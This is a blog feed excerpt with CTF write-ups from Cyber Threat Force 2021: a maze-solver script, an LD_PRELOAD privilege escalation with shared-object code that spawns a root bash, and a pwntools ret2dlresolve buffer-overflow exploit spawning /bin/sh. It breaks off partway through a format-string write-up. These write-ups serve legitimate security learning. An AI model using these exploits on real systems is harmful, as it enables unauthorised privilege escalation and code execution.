import math from pwn import * from astar import AStar def parse_maze(source): source = source.strip() source = source.split(&amp;#39;\n&amp;#39;) source = source[:-1] # Remove last line (dots) source = [list(l[1:-1]) for l in source] # Remove left and right dots return source # Mostly copied from the astar package example.</description><content>&lt;p>This challenge involved solving an ASCII maze in under 10 seconds. I can&amp;rsquo;t include a demo because I&amp;rsquo;m writing this after the CTF ended.&lt;/p>
&lt;p>My script uses the &lt;a href="https://github.com/jrialland/python-astar">astar&lt;/a> package, because I was too lazy to re-implement A* manually. It isn&amp;rsquo;t particularly pretty, but at least it is functionnal.&lt;/p>
&lt;p>Here it is:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> math
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> astar &lt;span style="color:#f92672">import&lt;/span> AStar
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">parse_maze&lt;/span>(source):
source &lt;span style="color:#f92672">=&lt;/span> source&lt;span style="color:#f92672">.&lt;/span>strip()
source &lt;span style="color:#f92672">=&lt;/span> source&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
source &lt;span style="color:#f92672">=&lt;/span> source[:&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#75715e"># Remove last line (dots)&lt;/span>
source &lt;span style="color:#f92672">=&lt;/span> [list(l[&lt;span style="color:#ae81ff">1&lt;/span>:&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>]) &lt;span style="color:#66d9ef">for&lt;/span> l &lt;span style="color:#f92672">in&lt;/span> source] &lt;span style="color:#75715e"># Remove left and right dots&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> source
&lt;span style="color:#75715e"># Mostly copied from the astar package example.&lt;/span>
&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">MazeSolver&lt;/span>(AStar):
&lt;span style="color:#66d9ef">def&lt;/span> __init__(self, maze):
self&lt;span style="color:#f92672">.&lt;/span>maze &lt;span style="color:#f92672">=&lt;/span> maze
self&lt;span style="color:#f92672">.&lt;/span>height &lt;span style="color:#f92672">=&lt;/span> len(maze)
self&lt;span style="color:#f92672">.&lt;/span>width &lt;span style="color:#f92672">=&lt;/span> len(maze[&lt;span style="color:#ae81ff">0&lt;/span>])
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">heuristic_cost_estimate&lt;/span>(self, n1, n2):
(x1, y1) &lt;span style="color:#f92672">=&lt;/span> n1
(x2, y2) &lt;span style="color:#f92672">=&lt;/span> n2
&lt;span style="color:#66d9ef">return&lt;/span> math&lt;span style="color:#f92672">.&lt;/span>hypot(x2 &lt;span style="color:#f92672">-&lt;/span> x1, y2 &lt;span style="color:#f92672">-&lt;/span> y1)
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">distance_between&lt;/span>(self, n1, n2):
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">neighbors&lt;/span>(self, node):
x, y &lt;span style="color:#f92672">=&lt;/span> node
&lt;span style="color:#66d9ef">return&lt;/span> [
(nx, ny)
&lt;span style="color:#66d9ef">for&lt;/span> nx, ny
&lt;span style="color:#f92672">in&lt;/span> [
(x, y &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>),
(x, y &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>),
(x &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>, y),
(x &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>, y)
]
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">&amp;lt;=&lt;/span> nx &lt;span style="color:#f92672">&amp;lt;&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>width &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">&amp;lt;=&lt;/span> ny &lt;span style="color:#f92672">&amp;lt;&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>height &lt;span style="color:#f92672">and&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>maze[ny][nx] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39; &amp;#39;&lt;/span>
]
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">sol_to_dir&lt;/span>(i):
last &lt;span style="color:#f92672">=&lt;/span> None
steps &lt;span style="color:#f92672">=&lt;/span> []
&lt;span style="color:#66d9ef">for&lt;/span> element &lt;span style="color:#f92672">in&lt;/span> i:
&lt;span style="color:#66d9ef">if&lt;/span> last &lt;span style="color:#f92672">is&lt;/span> None:
last &lt;span style="color:#f92672">=&lt;/span> element
&lt;span style="color:#66d9ef">continue&lt;/span>
old_x, old_y &lt;span style="color:#f92672">=&lt;/span> last
x, y &lt;span style="color:#f92672">=&lt;/span> element
&lt;span style="color:#66d9ef">if&lt;/span> old_x &lt;span style="color:#f92672">&amp;lt;&lt;/span> x:
steps&lt;span style="color:#f92672">.&lt;/span>append(&lt;span style="color:#e6db74">&amp;#39;O&amp;#39;&lt;/span>)
&lt;span style="color:#66d9ef">elif&lt;/span> old_x &lt;span style="color:#f92672">&amp;gt;&lt;/span> x:
steps&lt;span style="color:#f92672">.&lt;/span>append(&lt;span style="color:#e6db74">&amp;#39;E&amp;#39;&lt;/span>)
&lt;span style="color:#66d9ef">elif&lt;/span> old_y &lt;span style="color:#f92672">&amp;lt;&lt;/span> y:
steps&lt;span style="color:#f92672">.&lt;/span>append(&lt;span style="color:#e6db74">&amp;#39;S&amp;#39;&lt;/span>)
&lt;span style="color:#66d9ef">elif&lt;/span> old_y &lt;span style="color:#f92672">&amp;gt;&lt;/span> y:
steps&lt;span style="color:#f92672">.&lt;/span>append(&lt;span style="color:#e6db74">&amp;#39;N&amp;#39;&lt;/span>)
&lt;span style="color:#66d9ef">else&lt;/span>:
&lt;span style="color:#66d9ef">raise&lt;/span> &lt;span style="color:#a6e22e">RuntimeError&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;should not happen&amp;#39;&lt;/span>)
last &lt;span style="color:#f92672">=&lt;/span> element
&lt;span style="color:#66d9ef">return&lt;/span> steps
r &lt;span style="color:#f92672">=&lt;/span> remote(&lt;span style="color:#e6db74">&amp;#39;XXX.XXX.XXX.XXX&amp;#39;&lt;/span>, &lt;span style="color:#ae81ff">00000&lt;/span>)
header &lt;span style="color:#f92672">=&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>recvuntil(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;.&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">92&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>decode()
maze &lt;span style="color:#f92672">=&lt;/span> parse_maze(r&lt;span style="color:#f92672">.&lt;/span>recvuntil(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;.&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">92&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>decode())
width &lt;span style="color:#f92672">=&lt;/span> len(maze[&lt;span style="color:#ae81ff">0&lt;/span>])
height &lt;span style="color:#f92672">=&lt;/span> len(maze)
&lt;span style="color:#75715e"># We want the path from the bottom right corner, to the top left one.&lt;/span>
start &lt;span style="color:#f92672">=&lt;/span> (width &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>, height &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>)
goal &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>)
solution &lt;span style="color:#f92672">=&lt;/span> list(MazeSolver(maze)&lt;span style="color:#f92672">.&lt;/span>astar(start, goal))
solution &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join(sol_to_dir(solution))
r&lt;span style="color:#f92672">.&lt;/span>send(f&lt;span style="color:#e6db74">&amp;#39;{solution}&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;---------------&amp;#39;&lt;/span>)
&lt;span style="color:#66d9ef">print&lt;/span>(r&lt;span style="color:#f92672">.&lt;/span>recvall()&lt;span style="color:#f92672">.&lt;/span>decode())
r&lt;span style="color:#f92672">.&lt;/span>close()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The flag was &lt;code>CYBERTF{M@ze_Mast3r}&lt;/code>.&lt;/p>
&lt;p>You can &lt;a href="https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/misc/return-to-the-school">view the sources on github&lt;/a> or &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item><item><title>Writeup Cyber Threat Force : PrivEsc</title><link>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-privesc/</link><pubDate>Thu, 08 Jul 2021 04:10:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-privesc/</guid><description>For this challenge, we were given SSH access to a machine, as the user ctf. After running sudo -l, we quickly find that we can run the /opt/Ivazov binary as ctf_cracked. The user in question has a flag.txt file in their home, which only they can read.
We also notice env_keep += LD_PRELOAD. From there, we can try an LD_PRELOAD exploit. The steps taken here are copied from the guide was was just linked.</description><content>&lt;p>For this challenge, we were given SSH access to a machine, as the user &lt;code>ctf&lt;/code>. After running &lt;code>sudo -l&lt;/code>, we quickly find that we can run the &lt;code>/opt/Ivazov&lt;/code> binary as &lt;code>ctf_cracked&lt;/code>. The user in question has a &lt;code>flag.txt&lt;/code> file in their home, which only they can read.&lt;/p>
&lt;p>We also notice &lt;code>env_keep += LD_PRELOAD&lt;/code>. From there, we can try an &lt;a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld_preload">LD_PRELOAD exploit&lt;/a>. The steps taken here are copied from the guide was was just linked.&lt;/p>
&lt;p>We save this code in &lt;code>/tmp/pe.c&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;sys/types.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">_init&lt;/span>() {
unsetenv(&lt;span style="color:#e6db74">&amp;#34;LD_PRELOAD&amp;#34;&lt;/span>);
setgid(&lt;span style="color:#ae81ff">0&lt;/span>);
setuid(&lt;span style="color:#ae81ff">0&lt;/span>);
system(&lt;span style="color:#e6db74">&amp;#34;/bin/bash&amp;#34;&lt;/span>);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We compile and run it:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ cd /tmp
$ &lt;span style="color:#75715e"># write the code to pe.c&lt;/span>
$ gcc -fPIC -shared -o pe.so pe.c -nostartfiles
$ sudo -u ctf_cracked LD_PRELOAD&lt;span style="color:#f92672">=&lt;/span>pe.so /opt/Ivazov
$ &lt;span style="color:#75715e"># shell as ctf_cracked&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And we can now cat &lt;code>/home/ctf_cracked/flag.txt&lt;/code>: &lt;code>CYBERTF{LD_PRELOAD_2_Bypass_Ivazov}&lt;/code>.&lt;/p>
&lt;p>You can &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item><item><title>Writeup Cyber Threat Force : bof_3</title><link>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-3/</link><pubDate>Thu, 08 Jul 2021 02:12:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-3/</guid><description>For this challenge, we also were given a service executable. It was hosted remotely.
NOTE: since I&amp;rsquo;m writting this after the CTF ended, the demos are done locally.
$ checksec ./service [*] &amp;#39;/home/vivescere/ctf/bof_3/service&amp;#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) $ ./service password: mypassword nop NX enabled, and partial RELRO. Let&amp;rsquo;s take a look at the binary using Ghidra:
undefined4 main(void) { ignorMe(&amp;amp;stack0x00000004); puts(&amp;#34;password: &amp;#34;); vuln(); puts(&amp;#34;nop&amp;#34;); return 0; } void vuln(void) { undefined local_70 [104]; read(0,local_70,0x96); return; } We have an overflow, but not much else going on.</description><content>&lt;p>For this challenge, we also were given a service executable. It was hosted remotely.&lt;/p>
&lt;p>NOTE: since I&amp;rsquo;m writting this after the CTF ended, the demos are done locally.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ checksec ./service
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/home/vivescere/ctf/bof_3/service&amp;#39;&lt;/span>
Arch: i386-32-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE &lt;span style="color:#f92672">(&lt;/span>0x8048000&lt;span style="color:#f92672">)&lt;/span>
$ ./service
password:
mypassword
nop
&lt;/code>&lt;/pre>&lt;/div>&lt;p>NX enabled, and partial RELRO. Let&amp;rsquo;s take a look at the binary using Ghidra:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">undefined4 &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>) {
ignorMe(&lt;span style="color:#f92672">&amp;amp;&lt;/span>stack0x00000004);
puts(&lt;span style="color:#e6db74">&amp;#34;password: &amp;#34;&lt;/span>);
vuln();
puts(&lt;span style="color:#e6db74">&amp;#34;nop&amp;#34;&lt;/span>);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">vuln&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>) {
undefined local_70 [&lt;span style="color:#ae81ff">104&lt;/span>];
read(&lt;span style="color:#ae81ff">0&lt;/span>,local_70,&lt;span style="color:#ae81ff">0x96&lt;/span>);
&lt;span style="color:#66d9ef">return&lt;/span>;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We have an overflow, but not much else going on. We won&amp;rsquo;t be able to leak an address from the libc using a format string exploit, like on &lt;a href="https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-2">the last challenge&lt;/a>.&lt;/p>
&lt;p>We can try the &lt;a href="https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve">ret2dlresolve&lt;/a> technique. Pwntools even has a nice module for it.&lt;/p>
&lt;p>I found the offset using &lt;code>cyclic&lt;/code> from pwntools.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
exe &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#34;./service&amp;#34;&lt;/span>)
context&lt;span style="color:#f92672">.&lt;/span>binary &lt;span style="color:#f92672">=&lt;/span> exe
context&lt;span style="color:#f92672">.&lt;/span>terminal &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#39;konsole&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-e&amp;#39;&lt;/span>]
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">conn&lt;/span>():
&lt;span style="color:#66d9ef">if&lt;/span> args&lt;span style="color:#f92672">.&lt;/span>LOCAL:
r &lt;span style="color:#f92672">=&lt;/span> process([exe&lt;span style="color:#f92672">.&lt;/span>path])
&lt;span style="color:#66d9ef">else&lt;/span>:
r &lt;span style="color:#f92672">=&lt;/span> remote(&lt;span style="color:#e6db74">&amp;#39;XXX.XXX.XXX.XXX&amp;#39;&lt;/span>, &lt;span style="color:#ae81ff">00000&lt;/span>)
&lt;span style="color:#66d9ef">return&lt;/span> r
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>():
r &lt;span style="color:#f92672">=&lt;/span> conn()
r&lt;span style="color:#f92672">.&lt;/span>recvuntil(&lt;span style="color:#e6db74">&amp;#39;:&amp;#39;&lt;/span>)
r&lt;span style="color:#f92672">.&lt;/span>recvline()
offset &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">112&lt;/span>
rop &lt;span style="color:#f92672">=&lt;/span> ROP(exe)
dlresolve &lt;span style="color:#f92672">=&lt;/span> Ret2dlresolvePayload(exe, symbol&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;system&amp;#34;&lt;/span>, args&lt;span style="color:#f92672">=&lt;/span>[&lt;span style="color:#e6db74">&amp;#34;/bin/sh&amp;#34;&lt;/span>])
rop&lt;span style="color:#f92672">.&lt;/span>read(&lt;span style="color:#ae81ff">0&lt;/span>, dlresolve&lt;span style="color:#f92672">.&lt;/span>data_addr)
rop&lt;span style="color:#f92672">.&lt;/span>ret2dlresolve(dlresolve)
raw_rop &lt;span style="color:#f92672">=&lt;/span> rop&lt;span style="color:#f92672">.&lt;/span>chain()
r&lt;span style="color:#f92672">.&lt;/span>sendline(flat({offset: bytes(rop)}))
r&lt;span style="color:#f92672">.&lt;/span>sendline(dlresolve&lt;span style="color:#f92672">.&lt;/span>payload)
r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;__main__&amp;#34;&lt;/span>:
main()
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ python solve.py LOCAL
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/home/vivescere/ctf/bof_3/service&amp;#39;&lt;/span>
Arch: i386-32-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE &lt;span style="color:#f92672">(&lt;/span>0x8048000&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Starting local process &lt;span style="color:#e6db74">&amp;#39;/home/vivescere/ctf/bof_3/service&amp;#39;&lt;/span>: pid &lt;span style="color:#ae81ff">846530&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Loaded &lt;span style="color:#ae81ff">10&lt;/span> cached gadgets &lt;span style="color:#66d9ef">for&lt;/span> &lt;span style="color:#e6db74">&amp;#39;./service&amp;#39;&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Switching to interactive mode
$ pwd
/home/vivescere/ctf/bof_3
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The flag is &lt;code>CYBERTF{Zeroleak@nd_bruteF0rc3}&lt;/code>. It was in &lt;code>/home/ctf/flag.txt&lt;/code>.&lt;/p>
&lt;p>You can &lt;a href="https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/pwn/bof3">view the sources on github&lt;/a> or &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item><item><title>Writeup Cyber Threat Force : bof_2 (with PrivEsc)</title><link>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-2/</link><pubDate>Wed, 07 Jul 2021 20:12:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-2/</guid><description>For this challenge, we were also given a service executable. It was also hosted remotely.
NOTE: since I&amp;rsquo;m writting this after the CTF ended, the demos are done locally.
Level 1 $ checksec service [*] &amp;#39;/home/vivescere/ctf/bof_2/service&amp;#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments $ ./service Hello authentifie toi ! Username: vivescere Bienvenue vivescere password: mypassword oops i have lost my db sorry This time, the only protection that&amp;rsquo;s activated is PIE, which means addresses won&amp;rsquo;t be stable.</description><content>&lt;p>For this challenge, we were also given a &lt;code>service&lt;/code> executable. It was also hosted remotely.&lt;/p>
&lt;p>NOTE: since I&amp;rsquo;m writting this after the CTF ended, the demos are done locally.&lt;/p>
&lt;h2 id="level-1">Level 1&lt;/h2>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ checksec service
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/home/vivescere/ctf/bof_2/service&amp;#39;&lt;/span>
Arch: i386-32-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX disabled
PIE: PIE enabled
RWX: Has RWX segments
$ ./service
Hello authentifie toi !
Username: vivescere
Bienvenue vivescere
password: mypassword
oops i have lost my db sorry
&lt;/code>&lt;/pre>&lt;/div>&lt;p>This time, the only protection that&amp;rsquo;s activated is PIE, which means addresses won&amp;rsquo;t be stable. We can take a look at the the binary in Ghidra:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">undefined4 &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>) {
ignorMe(&lt;span style="color:#f92672">&amp;amp;&lt;/span>stack0x00000004);
vuln();
puts(&lt;span style="color:#e6db74">&amp;#34;oops i have lost my db sorry&amp;#34;&lt;/span>);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">vuln&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>) {
undefined &lt;span style="color:#f92672">*&lt;/span>puVar1;
size_t sVar2;
&lt;span style="color:#66d9ef">int&lt;/span> iVar3;
uint uVar4;
undefined4 &lt;span style="color:#f92672">*&lt;/span>puVar5;
byte bVar6;
&lt;span style="color:#66d9ef">char&lt;/span> cStack130;
undefined local_81 [&lt;span style="color:#ae81ff">76&lt;/span>];
undefined4 uStack53;
undefined local_31 [&lt;span style="color:#ae81ff">17&lt;/span>];
undefined4 uStack32;
undefined auStack28 [&lt;span style="color:#ae81ff">12&lt;/span>];
bVar6 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
puts(&lt;span style="color:#e6db74">&amp;#34;Hello authentifie toi !&amp;#34;&lt;/span>);
printf(&lt;span style="color:#e6db74">&amp;#34;Username: &amp;#34;&lt;/span>);
local_31._0_4_ &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
uStack32 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
puVar1 &lt;span style="color:#f92672">=&lt;/span> (undefined &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#ae81ff">0x0&lt;/span>;
&lt;span style="color:#66d9ef">do&lt;/span> {
&lt;span style="color:#f92672">*&lt;/span>(undefined4 &lt;span style="color:#f92672">*&lt;/span>)(puVar1 &lt;span style="color:#f92672">+&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span>)(local_31 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>)) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
puVar1 &lt;span style="color:#f92672">=&lt;/span> puVar1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>;
} &lt;span style="color:#66d9ef">while&lt;/span> (puVar1 &lt;span style="color:#f92672">&amp;lt;&lt;/span> auStack28 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span>)(local_31 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>));
local_81._0_4_ &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
uStack53 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
uVar4 &lt;span style="color:#f92672">=&lt;/span> (uint)(local_31 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span>)(local_81 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>)) &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>;
puVar5 &lt;span style="color:#f92672">=&lt;/span> (undefined4 &lt;span style="color:#f92672">*&lt;/span>)(local_81 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>);
&lt;span style="color:#66d9ef">while&lt;/span> (uVar4 &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
uVar4 &lt;span style="color:#f92672">=&lt;/span> uVar4 &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;span style="color:#f92672">*&lt;/span>puVar5 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
puVar5 &lt;span style="color:#f92672">=&lt;/span> puVar5 &lt;span style="color:#f92672">+&lt;/span> (uint)bVar6 &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
}
fgets(local_81,&lt;span style="color:#ae81ff">0x50&lt;/span>,stdin);
sVar2 &lt;span style="color:#f92672">=&lt;/span> strlen(local_81);
(&lt;span style="color:#f92672">&amp;amp;&lt;/span>cStack130)[sVar2] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;\0&amp;#39;&lt;/span>;
printf(&lt;span style="color:#e6db74">&amp;#34;Bienvenue &amp;#34;&lt;/span>);
printf(local_81);
printf(&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">password: &amp;#34;&lt;/span>);
__isoc99_scanf(&lt;span style="color:#f92672">&amp;amp;&lt;/span>DAT_00012042,local_31);
iVar3 &lt;span style="color:#f92672">=&lt;/span> strcmp(local_31,local_81);
&lt;span style="color:#66d9ef">if&lt;/span> (iVar3 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
puts(&lt;span style="color:#e6db74">&amp;#34;WTF ?&amp;#34;&lt;/span>);
}
&lt;span style="color:#66d9ef">return&lt;/span>;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>There is an obvious call to &lt;code>printf&lt;/code> with &lt;code>local_81&lt;/code>, which we can use in a format string exploit, and a call to &lt;code>scanf&lt;/code>, which we&amp;rsquo;ll use for our buffer overflow.&lt;/p>
&lt;p>Starting with figuring out the offset:&lt;/p>
